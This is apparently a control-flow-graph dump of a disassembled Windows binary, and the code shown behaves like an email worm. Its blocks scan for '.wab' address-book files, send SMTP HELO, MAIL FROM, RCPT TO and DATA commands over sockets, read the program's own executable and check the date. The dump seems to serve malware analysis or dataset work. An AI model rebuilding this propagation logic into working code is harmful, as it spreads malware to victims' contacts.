+node sub_4010DD(4198621) info:
+ start: 4198621
+ prev: []
+ instructions: 
+  4198621, ['push', 'ebp']
+  4198622, ['mov', 'ebp,esp']
+  4198624, ['add', 'esp,0FFFFFFFCh']
+  4198627, ['push', 'esi']
+  4198628, ['push', 'edi']
+  4198629, ['push', 'ebx']
+  4198630, ['mov', '[ebp+var_4],0']
+  4198637, ['mov', 'esi,[ebp+arg_0]']
+  4198640, ['mov', 'edi,[ebp+arg_4]']
+  4198643, ['mov', 'ecx,[ebp+arg_8]']
+  4198646, ['xor', 'eax,eax']
+ next: [4198648]
+
+node :116
+node sub_402CD8(4205839) info:
+ start: 4205839
+ prev: []
+ instructions: 
+  4205839, ['push', 'esi;lpString2']
+  4205840, ['call', 'sub_402CA7']
+ next: [4205845]
+
+node :117
+node sub_402E35(4206286) info:
+ start: 4206286
+ prev: []
+ instructions: 
+  4206286, ['push', '5;int']
+  4206288, ['push', '0;int']
+  4206290, ['push', '0C8h;int']
+  4206295, ['push', '[ebp+arg_4];int']
+  4206298, ['push', '[ebp+s];s']
+  4206301, ['call', 'sub_401A3D']
+  4206306, ['test', 'eax,eax']
+  4206308, ['jz', 'loc_4030E4']
+ next: [4206314, 4206820]
+
+node :118
+node sub_402E35(4206665) info:
+ start: 4206665
+ prev: []
+ instructions: 
+  4206665, ['mov', 'edx,[ebp+arg_4]']
+  4206668, ['mov', 'edx,[edx]']
+  4206670, ['lea', 'eax,[ebp+nNumberOfBytesToWrite]']
+  4206676, ['push', 'eax']
+  4206677, ['push', '80h']
+  4206682, ['lea', 'eax,[ebp+Buffer]']
+  4206688, ['push', 'eax']
+  4206689, ['push', '[ebp+arg_4]']
+  4206692, ['call', 'dwordptr[edx+0Ch]']
+  4206695, ['cmp', '[ebp+nNumberOfBytesToWrite],0']
+  4206702, ['jz', 'shortloc_403093']
+ next: [4206704, 4206739]
+
+node :119
+node sub_402E35(4206272) info:
+ start: 4206272
+ prev: []
+ instructions: 
+  4206272, ['cmp', '[ebp+var_152],4']
+  4206279, ['jz', 'shortloc_402ECE']
+ next: [4206281, 4206286]
+
+node :120
+node sub_402BD5(4205676) info:
+ start: 4205676
+ prev: []
+ instructions: 
+  4205676, ['push', '[ebp+lpString];lpFileName']
+  4205679, ['call', 'sub_402B99']
+ next: [4205684]
+
+node :121
+node sub_402BD5(4205628) info:
+ start: 4205628
+ prev: []
+ instructions: 
+  4205628, ['push', 'edx;lpString2']
+  4205629, ['push', '[ebp+lpString];lpString1']
+  4205632, ['call', 'lstrcatA']
+  4205637, ['mov', 'edx,[ebp+lpFindFileData]']
+  4205640, ['lea', 'edx,[edx]']
+  4205642, ['test', 'dwordptr[edx],10h']
+  4205648, ['jz', 'shortloc_402C6C']
+ next: [4205650, 4205676]
+
+node :122
+node sub_40298F(4205070) info:
+ start: 4205070
+ prev: []
+ instructions: 
+  4205070, ['stosb']
+  4205071, ['cmp', 'al,40h']
+  4205073, ['jnz', 'shortloc_402A15']
+ next: [4205075, 4205077]
+
+node :123
+node sub_402741(4204401) info:
+ start: 4204401
+ prev: []
+ instructions: 
+  4204401, ['push', '0Ch;dwBytes']
+  4204403, ['push', '40h;uFlags']
+  4204405, ['call', 'GlobalAlloc']
+  4204410, ['cld']
+  4204411, ['stosd']
+  4204412, ['dec', 'ebx']
+  4204413, ['jnz', 'shortloc_402771']
+ next: [4204415, 4204401]
+
+node :124
+node sub_402741(4204353) info:
+ start: 4204353
+ prev: []
+ instructions: 
+  4204353, ['push', 'edi']
+  4204354, ['push', 'ebx']
+  4204355, ['push', '0;lpName']
+  4204357, ['push', '0;bInitialOwner']
+  4204359, ['push', '0;lpMutexAttributes']
+  4204361, ['call', 'CreateMutexA']
+  4204366, ['mov', 'hMutex,eax']
+  4204371, ['mov', 'dword_407D3A,0']
+  4204381, ['mov', 'dword_407D3E,0']
+  4204391, ['mov', 'ebx,0Ah']
+  4204396, ['mov', 'edi,offsetword_407D42']
+ next: [4204401]
+
+node :125
+node sub_401159(4198782) info:
+ start: 4198782
+ prev: []
+ instructions: 
+  4198782, ['rol', 'edx,8']
+  4198785, ['loop', 'sub_401159']
+ next: [4198745, 4198787]
+
+node :126
+node sub_401F31(4202297) info:
+ start: 4202297
+ prev: []
+ instructions: 
+  4202297, ['cld']
+  4202298, ['xor', 'eax,eax']
+  4202300, ['lodsb']
+  4202301, ['test', 'al,0C0h']
+  4202303, ['jz', 'shortloc_401F5D']
+ next: [4202305, 4202333]
+
+node :127
+node sub_4021D1(4203491) info:
+ start: 4203491
+ prev: []
+ instructions: 
+  4203491, ['push', '[ebp+ppstm]']
+  4203494, ['call', 'sub_401473']
+ next: [4203499]
+
+node :128
+node sub_4021D1(4203546) info:
+ start: 4203546
+ prev: []
+ instructions: 
+  4203546, ['jmp', 'shortloc_4023EB']
+ next: [4203499]
+
+node :129
+node sub_40298F(4205054) info:
+ start: 4205054
+ prev: []
+ instructions: 
+  4205054, ['cld']
+  4205055, ['mov', 'esi,ebx']
+  4205057, ['lea', 'edi,[ebp+String]']
+  4205063, ['xor', 'edx,edx']
+ next: [4205065]
+
+node :130
+node sub_40298F(4205077) info:
+ start: 4205077
+ prev: []
+ instructions: 
+  4205077, ['loop', 'loc_402A09']
+ next: [4205065, 4205079]
+
+node :131
+node sub_401F31(4202353) info:
+ start: 4202353
+ prev: []
+ instructions: 
+  4202353, ['lodsb']
+  4202354, ['stosb']
+  4202355, ['dec', 'ecx']
+  4202356, ['jnz', 'shortloc_401F71']
+ next: [4202358, 4202353]
+
+node :132
+node sub_401F31(4202333) info:
+ start: 4202333
+ prev: []
+ instructions: 
+  4202333, ['or', 'al,al']
+  4202335, ['jz', 'shortloc_401F7E']
+ next: [4202337, 4202366]
+
+node :133
+node sub_401F31(4202337) info:
+ start: 4202337
+ prev: []
+ instructions: 
+  4202337, ['push', 'eax']
+  4202338, ['push', '[ebp+lpString];lpString']
+  4202341, ['call', 'lstrlenA']
+  4202346, ['mov', 'edi,[ebp+lpString]']
+  4202349, ['add', 'edi,eax']
+  4202351, ['pop', 'ecx']
+  4202352, ['cld']
+ next: [4202353]
+
+node :134
+node sub_402E35(4206704) info:
+ start: 4206704
+ prev: []
+ instructions: 
+  4206704, ['push', '0;lpOverlapped']
+  4206706, ['lea', 'eax,[ebp+nNumberOfBytesToWrite]']
+  4206712, ['push', 'eax;lpNumberOfBytesWritten']
+  4206713, ['push', '[ebp+nNumberOfBytesToWrite];nNumberOfBytesToWrite']
+  4206719, ['lea', 'eax,[ebp+Buffer]']
+  4206725, ['push', 'eax;lpBuffer']
+  4206726, ['push', '[ebp+hFile];hFile']
+  4206732, ['call', 'WriteFile']
+  4206737, ['jmp', 'shortloc_403049']
+ next: [4206665]
+
+node :135
+node sub_4021D1(4203499) info:
+ start: 4203499
+ prev: []
+ instructions: 
+  4203499, ['mov', 'edx,[ebp+ppstm]']
+  4203502, ['mov', 'edx,[edx]']
+  4203504, ['lea', 'eax,[ebp+len]']
+  4203507, ['push', 'eax']
+  4203508, ['push', '400h']
+  4203513, ['push', '[ebp+buf]']
+  4203516, ['push', '[ebp+ppstm]']
+  4203519, ['call', 'dwordptr[edx+0Ch]']
+  4203522, ['cmp', '[ebp+len],0']
+  4203526, ['jbe', 'shortloc_40241C']
+ next: [4203528, 4203548]
+
+node :136
+node sub_402E35(4206441) info:
+ start: 4206441
+ prev: []
+ instructions: 
+  4206441, ['push', '0;int']
+  4206443, ['push', '4;int']
+  4206445, ['push', '4;int']
+  4206447, ['push', '[ebp+arg_4];int']
+  4206450, ['push', '[ebp+s];s']
+  4206453, ['call', 'sub_4019D4']
+  4206458, ['test', 'eax,eax']
+  4206460, ['jz', 'loc_4030E4']
+ next: [4206466, 4206820]
+
+node :137
+node sub_401F86(4202374) info:
+ start: 4202374
+ prev: []
+ instructions: 
+  4202374, ['push', 'ebp']
+  4202375, ['mov', 'ebp,esp']
+  4202377, ['jmp', 'shortloc_401F92']
+ next: [4202386]
+
+node :138
+node sub_401AA0(4201183) info:
+ start: 4201183
+ prev: []
+ instructions: 
+  4201183, ['push', '0']
+  4201185, ['push', '[ebp+var_C]']
+  4201188, ['push', '[ebp+arg_4]']
+  4201191, ['call', 'sub_4013FC']
+  4201196, ['mov', 'edx,[ebp+arg_4]']
+  4201199, ['mov', 'edx,[edx]']
+  4201201, ['push', '0']
+  4201203, ['push', '4']
+  4201205, ['lea', 'eax,[ebp+var_5]']
+  4201208, ['push', 'eax']
+  4201209, ['push', '[ebp+arg_4]']
+  4201212, ['call', 'dwordptr[edx+0Ch]']
+  4201215, ['push', '[ebp+arg_4]']
+  4201218, ['call', 'sub_401460']
+  4201223, ['cmp', '[ebp+var_2],20h']
+  4201227, ['jnz', 'shortloc_401B18']
+ next: [4201229, 4201240]
+
+node :139
+node sub_4021D1(4203432) info:
+ start: 4203432
+ prev: []
+ instructions: 
+  4203432, ['push', 'offsetString;"DATA\\r\\n"']
+  4203437, ['call', 'lstrlenA']
+  4203442, ['push', '0;flags']
+  4203444, ['push', 'eax;len']
+  4203445, ['push', 'offsetString;"DATA\\r\\n"']
+  4203450, ['push', 'ebx;s']
+  4203451, ['call', 'send']
+  4203456, ['push', '0Fh;int']
+  4203458, ['push', '400h;int']
+  4203463, ['push', '[ebp+var_4];int']
+  4203466, ['push', 'ebx;s']
+  4203467, ['call', 'sub_401AA0']
+  4203472, ['test', 'eax,eax']
+  4203474, ['jz', 'shortloc_402440']
+ next: [4203476, 4203584]
+
+node :140
+node sub_40298F(4205075) info:
+ start: 4205075
+ prev: []
+ instructions: 
+  4205075, ['mov', 'edx,edi']
+ next: [4205077]
+
+node :141
+node sub_4021D1(4203101) info:
+ start: 4203101
+ prev: []
+ instructions: 
+  4203101, ['mov', 'esi,[ebp+buf]']
+  4203104, ['add', 'esi,800h']
+  4203110, ['push', '400h;namelen']
+  4203115, ['push', 'esi;name']
+  4203116, ['call', 'gethostname']
+  4203121, ['push', 'esi']
+  4203122, ['push', 'offsetaHeloS;"HELO%s\\r\\n"']
+  4203127, ['push', '[ebp+buf];LPSTR']
+  4203130, ['call', 'wsprintfA']
+  4203135, ['add', 'esp,0Ch']
+  4203138, ['push', '[ebp+buf];lpString']
+  4203141, ['call', 'lstrlenA']
+  4203146, ['push', '0;flags']
+  4203148, ['push', 'eax;len']
+  4203149, ['push', '[ebp+buf];buf']
+  4203152, ['push', 'ebx;s']
+  4203153, ['call', 'send']
+  4203158, ['push', '0Fh;int']
+  4203160, ['push', '400h;int']
+  4203165, ['push', '[ebp+var_4];int']
+  4203168, ['push', 'ebx;s']
+  4203169, ['call', 'sub_401AA0']
+  4203174, ['test', 'eax,eax']
+  4203176, ['jz', 'loc_402440']
+ next: [4203182, 4203584]
+
+node :142
+node sub_4021D1(4203350) info:
+ start: 4203350
+ prev: []
+ instructions: 
+  4203350, ['push', '[ebp+arg_0]']
+  4203353, ['push', 'offsetaRcptToS;"RCPTTO:<%s>\\r\\n"']
+  4203358, ['push', '[ebp+buf];LPSTR']
+  4203361, ['call', 'wsprintfA']
+  4203366, ['add', 'esp,0Ch']
+  4203369, ['push', '[ebp+buf];lpString']
+  4203372, ['call', 'lstrlenA']
+  4203377, ['push', '0;flags']
+  4203379, ['push', 'eax;len']
+  4203380, ['push', '[ebp+buf];buf']
+  4203383, ['push', 'ebx;s']
+  4203384, ['call', 'send']
+  4203389, ['push', '0Fh;int']
+  4203391, ['push', '400h;int']
+  4203396, ['push', '[ebp+var_4];int']
+  4203399, ['push', 'ebx;s']
+  4203400, ['call', 'sub_401AA0']
+  4203405, ['test', 'eax,eax']
+  4203407, ['jz', 'loc_402440']
+ next: [4203413, 4203584]
+
+node :143
+node sub_4021D1(4203201) info:
+ start: 4203201
+ prev: []
+ instructions: 
+  4203201, ['push', 'offsetbuf;"RSET\\r\\n"']
+  4203206, ['call', 'lstrlenA']
+  4203211, ['push', '0;flags']
+  4203213, ['push', 'eax;len']
+  4203214, ['push', 'offsetbuf;"RSET\\r\\n"']
+  4203219, ['push', 'ebx;s']
+  4203220, ['call', 'send']
+  4203225, ['push', '0Fh;int']
+  4203227, ['push', '400h;int']
+  4203232, ['push', '[ebp+var_4];int']
+  4203235, ['push', 'ebx;s']
+  4203236, ['call', 'sub_401AA0']
+  4203241, ['test', 'eax,eax']
+  4203243, ['jz', 'loc_402440']
+ next: [4203249, 4203584]
+
+node :144
+node sub_4021D1(4203056) info:
+ start: 4203056
+ prev: []
+ instructions: 
+  4203056, ['mov', 'ebx,eax']
+  4203058, ['push', '0Fh;int']
+  4203060, ['push', '400h;int']
+  4203065, ['push', '[ebp+var_4];int']
+  4203068, ['push', 'ebx;s']
+  4203069, ['call', 'sub_401AA0']
+  4203074, ['test', 'eax,eax']
+  4203076, ['jz', 'loc_402440']
+ next: [4203082, 4203584]
+
+node :145
+node sub_4021D1(4203268) info:
+ start: 4203268
+ prev: []
+ instructions: 
+  4203268, ['push', '[ebp+arg_4]']
+  4203271, ['push', 'offsetaMailFromS;"MAILFROM:<%s>\\r\\n"']
+  4203276, ['push', '[ebp+buf];LPSTR']
+  4203279, ['call', 'wsprintfA']
+  4203284, ['add', 'esp,0Ch']
+  4203287, ['push', '[ebp+buf];lpString']
+  4203290, ['call', 'lstrlenA']
+  4203295, ['push', '0;flags']
+  4203297, ['push', 'eax;len']
+  4203298, ['push', '[ebp+buf];buf']
+  4203301, ['push', 'ebx;s']
+  4203302, ['call', 'send']
+  4203307, ['push', '0Fh;int']
+  4203309, ['push', '400h;int']
+  4203314, ['push', '[ebp+var_4];int']
+  4203317, ['push', 'ebx;s']
+  4203318, ['call', 'sub_401AA0']
+  4203323, ['test', 'eax,eax']
+  4203325, ['jz', 'loc_402440']
+ next: [4203331, 4203584]
+
+node :146
+node sub_401159(4198745) info:
+ start: 4198745
+ prev: []
+ instructions: 
+  4198745, ['cmp', 'dl,3Eh']
+  4198748, ['jnb', 'shortloc_401175']
+ next: [4198750, 4198773]
+
+node :147
+node sub_4021D1(4203413) info:
+ start: 4203413
+ prev: []
+ instructions: 
+  4203413, ['push', '[ebp+var_4]']
+  4203416, ['call', 'sub_402105']
+  4203421, ['cmp', 'eax,303532h']
+  4203426, ['jnz', 'loc_402440']
+ next: [4203432, 4203584]
+
+node :148
+node sub_401F86(4202386) info:
+ start: 4202386
+ prev: []
+ instructions: 
+  4202386, ['mov', 'eax,[ebp+lpString]']
+  4202389, ['mov', 'byteptr[eax],0']
+  4202392, ['push', '[ebp+lpString];lpString']
+  4202395, ['push', '[ebp+arg_4];int']
+  4202398, ['push', '[ebp+arg_0];int']
+  4202401, ['call', 'sub_401F31']
+  4202406, ['push', 'eax']
+  4202407, ['push', 'offsetbyte_401F90']
+  4202412, ['push', '[ebp+lpString]']
+  4202415, ['call', 'StrTrimA']
+  4202420, ['pop', 'eax']
+  4202421, ['leave']
+  4202422, ['retn', '0Ch']
+ next: []
+
+node :149
+node sub_402B99(4205465) info:
+ start: 4205465
+ prev: []
+ instructions: 
+  4205465, ['push', 'ebp']
+  4205466, ['mov', 'ebp,esp']
+  4205468, ['push', 'edi']
+  4205469, ['mov', 'edi,offseta_wab;".wab"']
+ next: [4205474]
+
+node :150
+node sub_402B99(4205515) info:
+ start: 4205515
+ prev: []
+ instructions: 
+  4205515, ['cmp', 'byteptr[edi],0']
+  4205518, ['jnz', 'shortloc_402BA2']
+ next: [4205474, 4205520]
+
+node :151
+node sub_401B2A(4201322) info:
+ start: 4201322
+ prev: []
+ instructions: 
+  4201322, ['cmp', '[ebp+arg_4],0']
+  4201326, ['jnz', 'shortloc_401B7A']
+ next: [4201328, 4201338]
+
+node :152
+node sub_401AA0(4201238) info:
+ start: 4201238
+ prev: []
+ instructions: 
+  4201238, ['jmp', 'shortloc_401B24']
+ next: [4201252]
+
+node :153
+node sub_4021D1(4203548) info:
+ start: 4203548
+ prev: []
+ instructions: 
+  4203548, ['push', '0Fh;int']
+  4203550, ['push', '400h;int']
+  4203555, ['push', '[ebp+var_4];int']
+  4203558, ['push', 'ebx;s']
+  4203559, ['call', 'sub_401AA0']
+  4203564, ['test', 'eax,eax']
+  4203566, ['jz', 'shortloc_402440']
+ next: [4203568, 4203584]
+
+node :154
+node sub_402B99(4205497) info:
+ start: 4205497
+ prev: []
+ instructions: 
+  4205497, ['push', 'offsetsub_402B36;int']
+  4205502, ['push', '[ebp+lpFileName];lpFileName']
+  4205505, ['call', 'sub_402A64']
+  4205510, ['pop', 'edi']
+  4205511, ['leave']
+  4205512, ['retn', '4']
+ next: []
+
+node :155
+node sub_40166E(4200046) info:
+ start: 4200046
+ prev: []
+ instructions: 
+  4200046, ['push', 'ebp']
+  4200047, ['mov', 'ebp,esp']
+  4200049, ['add', 'esp,0FFFFFFD0h']
+  4200052, ['lea', 'eax,[ebp+SystemTime]']
+  4200055, ['push', 'eax;lpSystemTime']
+  4200056, ['call', 'GetLocalTime']
+  4200061, ['push', '10h']
+  4200063, ['lea', 'eax,[ebp+var_20]']
+  4200066, ['push', 'eax']
+  4200067, ['call', 'sub_401000']
+  4200072, ['mov', '[ebp+var_20.wYear],7D5h']
+  4200078, ['mov', '[ebp+var_20.wMonth],1']
+  4200084, ['mov', '[ebp+var_20.wDay],1']
+  4200090, ['lea', 'eax,[ebp+FileTime]']
+  4200093, ['push', 'eax;lpFileTime']
+  4200094, ['lea', 'eax,[ebp+SystemTime]']
+  4200097, ['push', 'eax;lpSystemTime']
+  4200098, ['call', 'SystemTimeToFileTime']
+  4200103, ['lea', 'eax,[ebp+FileTime2]']
+  4200106, ['push', 'eax;lpFileTime']
+  4200107, ['lea', 'eax,[ebp+var_20]']
+  4200110, ['push', 'eax;lpSystemTime']
+  4200111, ['call', 'SystemTimeToFileTime']
+  4200116, ['lea', 'eax,[ebp+FileTime2]']
+  4200119, ['push', 'eax;lpFileTime2']
+  4200120, ['lea', 'eax,[ebp+FileTime]']
+  4200123, ['push', 'eax;lpFileTime1']
+  4200124, ['call', 'CompareFileTime']
+  4200129, ['cmp', 'eax,1']
+  4200132, ['jnz', 'shortloc_4016CA']
+ next: [4200134, 4200138]
+
+node :156
+node sub_401F31(4202305) info:
+ start: 4202305
+ prev: []
+ instructions: 
+  4202305, ['and', 'al,3Fh']
+  4202307, ['shl', 'ax,8']
+  4202311, ['lodsb']
+  4202312, ['push', 'esi']
+  4202313, ['mov', 'esi,[ebp+arg_0]']
+  4202316, ['add', 'esi,eax']
+  4202318, ['push', '[ebp+lpString];lpString']
+  4202321, ['push', 'esi;int']
+  4202322, ['push', '[ebp+arg_0];int']
+  4202325, ['call', 'sub_401F31']
+  4202330, ['pop', 'esi']
+  4202331, ['jmp', 'shortloc_401F7E']
+ next: [4202366]
+
+node :157
+node sub_40246F(4203665) info:
+ start: 4203665
+ prev: []
+ instructions: 
+  4203665, ['push', 'esi;int']
+  4203666, ['push', '[ebp+arg_0];int']
+  4203669, ['push', '[ebp+lpString];lpString']
+  4203672, ['call', 'sub_402816']
+  4203677, ['push', 'esi;hMem']
+  4203678, ['call', 'GlobalFree']
+ next: [4203683]
+
+node :158
+node sub_4028AF(4204736) info:
+ start: 4204736
+ prev: []
+ instructions: 
+  4204736, ['lodsb']
+  4204737, ['cmp', 'al,30h']
+  4204739, ['jb', 'shortloc_4028C9']
+ next: [4204741, 4204745]
+
+node :159
+node sub_401AA0(4201240) info:
+ start: 4201240
+ prev: []
+ instructions: 
+  4201240, ['cmp', '[ebp+var_2],2Dh']
+  4201244, ['jz', 'shortloc_401B24']
+ next: [4201246, 4201252]
+
+node :160
+node sub_4028FD(4204812) info:
+ start: 4204812
+ prev: []
+ instructions: 
+  4204812, ['lodsb']
+  4204813, ['cmp', 'al,30h']
+  4204815, ['jb', 'shortloc_402915']
+ next: [4204817, 4204821]
+
+node :161
+node StartAddress(4201388) info:
+ start: 4201388
+ prev: []
+ instructions: 
+  4201388, ['push', 'ebp']
+  4201389, ['mov', 'ebp,esp']
+  4201391, ['add', 'esp,0FFFFFFECh']
+  4201394, ['push', 'esi']
+  4201395, ['push', 'ebx']
+  4201396, ['push', '10h']
+  4201398, ['lea', 'eax,[ebp+name]']
+  4201401, ['push', 'eax']
+  4201402, ['call', 'sub_401000']
+  4201407, ['mov', '[ebp+name.sa_family],2']
+  4201413, ['mov', 'esi,[ebp+hMem]']
+  4201416, ['mov', 'eax,[esi]']
+  4201418, ['mov', 'ebx,[esi+8]']
+  4201421, ['mov', 'esi,[esi+4]']
+  4201424, ['xchg', 'al,ah']
+  4201426, ['mov', 'wordptr[ebp+name.sa_data],ax']
+  4201430, ['mov', 'dwordptr[ebp+name.sa_data+2],0']
+  4201437, ['push', '6;protocol']
+  4201439, ['push', '1;type']
+  4201441, ['push', '2;af']
+  4201443, ['call', 'socket']
+  4201448, ['mov', '[ebx],eax']
+  4201450, ['push', '[ebp+hMem];hMem']
+  4201453, ['call', 'GlobalFree']
+  4201458, ['cmp', 'dwordptr[ebx],0FFFFFFFFh']
+  4201461, ['jnz', 'shortloc_401BFF']
+ next: [4201463, 4201471]
+
+node :162
+node sub_401F31(4202358) info:
+ start: 4202358
+ prev: []
+ instructions: 
+  4202358, ['mov', 'al,2Eh']
+  4202360, ['stosb']
+  4202361, ['xor', 'eax,eax']
+  4202363, ['stosb']
+  4202364, ['jmp', 'shortloc_401F39']
+ next: [4202297]
+
+node :163
+node sub_401F31(4202289) info:
+ start: 4202289
+ prev: []
+ instructions: 
+  4202289, ['push', 'ebp']
+  4202290, ['mov', 'ebp,esp']
+  4202292, ['push', 'esi']
+  4202293, ['push', 'edi']
+  4202294, ['mov', 'esi,[ebp+arg_4]']
+ next: [4202297]
+
+node :164
+node sub_401AA0(4201126) info:
+ start: 4201126
+ prev: []
+ instructions: 
+  4201126, ['push', '[ebp+arg_4]']
+  4201129, ['call', 'sub_401486']
+  4201134, ['push', '1']
+  4201136, ['push', '0']
+  4201138, ['push', '[ebp+arg_4]']
+  4201141, ['call', 'sub_4013FC']
+  4201146, ['mov', '[ebp+var_C],eax']
+  4201149, ['push', '5']
+  4201151, ['lea', 'eax,[ebp+var_5]']
+  4201154, ['push', 'eax']
+  4201155, ['call', 'sub_401000']
+  4201160, ['push', '[ebp+arg_C];int']
+  4201163, ['push', '0Ah;int']
+  4201165, ['push', '[ebp+arg_8];int']
+  4201168, ['push', '[ebp+arg_4];int']
+  4201171, ['push', '[ebp+s];s']
+  4201174, ['call', 'sub_401A3D']
+  4201179, ['test', 'eax,eax']
+  4201181, ['jz', 'shortlocret_401B26']
+ next: [4201183, 4201254]
+
+node :165
+node sub_4016CF(4200212) info:
+ start: 4200212
+ prev: []
+ instructions: 
+  4200212, ['push', '0;lpFileSizeHigh']
+  4200214, ['push', '[ebp+hFile];hFile']
+  4200217, ['call', 'GetFileSize']
+  4200222, ['mov', '[ebp+var_8],eax']
+  4200225, ['inc', 'eax']
+  4200226, ['jz', 'shortloc_40178E']
+ next: [4200228, 4200334]
+
+node :166
+node sub_4016CF(4200143) info:
+ start: 4200143
+ prev: []
+ instructions: 
+  4200143, ['push', 'ebp']
+  4200144, ['mov', 'ebp,esp']
+  4200146, ['add', 'esp,0FFFFFFF4h']
+  4200149, ['push', '2000h;dwBytes']
+  4200154, ['push', '40h;uFlags']
+  4200156, ['call', 'GlobalAlloc']
+  4200161, ['mov', '[ebp+lpFilename],eax']
+  4200164, ['push', '1FFFh;nSize']
+  4200169, ['push', '[ebp+lpFilename];lpFilename']
+  4200172, ['push', '0;hModule']
+  4200174, ['call', 'GetModuleFileNameA']
+  4200179, ['push', '0;hTemplateFile']
+  4200181, ['push', '0;dwFlagsAndAttributes']
+  4200183, ['push', '3;dwCreationDisposition']
+  4200185, ['push', '0;lpSecurityAttributes']
+  4200187, ['push', '1;dwShareMode']
+  4200189, ['push', '80000000h;dwDesiredAccess']
+  4200194, ['push', '[ebp+lpFilename];lpFileName']
+  4200197, ['call', 'CreateFileA']
+  4200202, ['mov', '[ebp+hFile],eax']
+  4200205, ['inc', 'eax']
+  4200206, ['jz', 'loc_401796']
+ next: [4200212, 4200342]
+
+node :167
+node sub_4019D4(4200916) info:
+ start: 4200916
+ prev: []
+ instructions: 
+  4200916, ['push', 'ebp']
+  4200917, ['mov', 'ebp,esp']
+  4200919, ['add', 'esp,0FFFFFF80h']
+  4200922, ['push', 'ebx']
+  4200923, ['mov', 'ebx,[ebp+arg_8]']
+  4200926, ['push', '[ebp+arg_C]']
+  4200929, ['push', '[ebp+s]']
+  4200932, ['call', 'sub_401977']
+  4200937, ['or', 'eax,eax']
+  4200939, ['jz', 'shortloc_401A31']
+ next: [4200941, 4201009]
+
+node :168
+node sub_4019D4(4201007) info:
+ start: 4201007
+ prev: []
+ instructions: 
+  4201007, ['jmp', 'shortloc_4019ED']
+ next: [4200941]
+
+node :169
+node sub_402E35(4206759) info:
+ start: 4206759
+ prev: []
+ instructions: 
+  4206759, ['push', 'offsetaUsd;"-usd"']
+  4206764, ['lea', 'eax,[ebp+String1]']
+  4206770, ['push', 'eax;lpString1']
+  4206771, ['call', 'lstrcatA']
+ next: [4206776]
+
+node :170
+node sub_40298F(4204977) info:
+ start: 4204977
+ prev: []
+ instructions: 
+  4204977, ['cmp', 'esi,[ebp+var_8]']
+  4204980, ['jnb', 'loc_402A5D']
+ next: [4204986, 4205149]
+
+node :171
+node start(4207077) info:
+ start: 4207077
+ prev: []
+ instructions: 
+  4207077, ['call', 'sub_402CD8']
+ next: [4207082]
+
+node :172
+node sub_4016CF(4200228) info:
+ start: 4200228
+ prev: []
+ instructions: 
+  4200228, ['push', '0;lpName']
+  4200230, ['push', '0;dwMaximumSizeLow']
+  4200232, ['push', '0;dwMaximumSizeHigh']
+  4200234, ['push', '2;flProtect']
+  4200236, ['push', '0;lpFileMappingAttributes']
+  4200238, ['push', '[ebp+hFile];hFile']
+  4200241, ['call', 'CreateFileMappingA']
+  4200246, ['or', 'eax,eax']
+  4200248, ['jz', 'shortloc_40178E']
+ next: [4200250, 4200334]
+
+node :173
+node sub_402E35(4206739) info:
+ start: 4206739
+ prev: []
+ instructions: 
+  4206739, ['push', '[ebp+hFile];hObject']
+  4206745, ['call', 'CloseHandle']
+  4206750, ['cmp', '[ebp+var_152],3']
+  4206757, ['jnz', 'shortloc_4030B8']
+ next: [4206759, 4206776]
+
+node :174
+node sub_402B99(4205474) info:
+ start: 4205474
+ prev: []
+ instructions: 
+  4205474, ['cld']
+  4205475, ['mov', 'edx,edi']
+  4205477, ['xor', 'eax,eax']
+  4205479, ['or', 'ecx,0FFFFFFFFh']
+  4205482, ['repne', 'scasb']
+  4205484, ['push', 'edx']
+  4205485, ['push', '[ebp+lpFileName]']
+  4205488, ['call', 'StrStrIA']
+  4205493, ['or', 'eax,eax']
+  4205495, ['jz', 'shortloc_402BCB']
+ next: [4205497, 4205515]
+
+node :175
+node sub_401B2A(4201258) info:
+ start: 4201258
+ prev: []
+ instructions: 
+  4201258, ['push', 'ebp']
+  4201259, ['mov', 'ebp,esp']
+  4201261, ['add', 'esp,0FFFFFFF0h']
+  4201264, ['push', 'ebx']
+  4201265, ['xor', 'ebx,ebx']
+  4201267, ['push', '6;protocol']
+  4201269, ['push', '1;type']
+  4201271, ['push', '2;af']
+  4201273, ['call', 'socket']
+  4201278, ['cmp', 'eax,0FFFFFFFFh']
+  4201281, ['jnz', 'shortloc_401B45']
+ next: [4201283, 4201285]
+
+node :176
+node sub_40298F(4204986) info:
+ start: 4204986
+ prev: []
+ instructions: 
+  4204986, ['inc', '[ebp+var_C]']
+  4204989, ['cmp', '[ebp+var_C],2710h']
+  4204996, ['jnz', 'shortloc_4029D4']
+ next: [4204998, 4205012]
+
+node :177
+node sub_402E35(4206806) info:
+ start: 4206806
+ prev: []
+ instructions: 
+  4206806, ['cmp', '[ebp+var_152],4']
+  4206813, ['jnz', 'shortloc_4030E4']
+ next: [4206815, 4206820]
+
+node :178
+node sub_4028FD(4204817) info:
+ start: 4204817
+ prev: []
+ instructions: 
+  4204817, ['cmp', 'al,39h']
+  4204819, ['jbe', 'shortloc_402939']
+ next: [4204821, 4204857]
+
+node :179
+node sub_4021D1(4203568) info:
+ start: 4203568
+ prev: []
+ instructions: 
+  4203568, ['push', '[ebp+var_4]']
+  4203571, ['call', 'sub_402105']
+  4203576, ['cmp', 'eax,303532h']
+  4203581, ['jnz', 'shortloc_402440']
+ next: [4203583, 4203584]
+
+node :180
+node sub_4028AF(4204741) info:
+ start: 4204741
+ prev: []
+ instructions: 
+  4204741, ['cmp', 'al,39h']
+  4204743, ['jbe', 'shortloc_4028ED']
+ next: [4204745, 4204781]
+
+node :181
+node sub_401B2A(4201328) info:
+ start: 4201328
+ prev: []
+ instructions: 
+  4201328, ['cmp', '[ebp+cp],0']
+  4201332, ['jnz', 'shortloc_401B7A']
+ next: [4201334, 4201338]
+
+node :182
+node sub_4019D4(4200941) info:
+ start: 4200941
+ prev: []
+ instructions: 
+  4200941, ['cmp', 'ebx,80h']
+  4200947, ['jbe', 'shortloc_4019FC']
+ next: [4200949, 4200956]
+
+node :183
+node sub_402816(4204566) info:
+ start: 4204566
+ prev: []
+ instructions: 
+  4204566, ['push', 'ebp']
+  4204567, ['mov', 'ebp,esp']
+  4204569, ['add', 'esp,0FFFFFFFCh']
+  4204572, ['push', 'ebx']
+  4204573, ['push', '0FFFFFFFFh;dwMilliseconds']
+  4204575, ['push', 'hMutex;hHandle']
+  4204581, ['call', 'WaitForSingleObject']
+  4204586, ['cmp', 'dword_407D3A,0Ah']
+  4204593, ['jb', 'shortloc_40283D']
+ next: [4204595, 4204605]
+
+node :184
+node sub_402E35(4206776) info:
+ start: 4206776
+ prev: []
+ instructions: 
+  4206776, ['push', '0;uCmdShow']
+  4206778, ['lea', 'eax,[ebp+String1]']
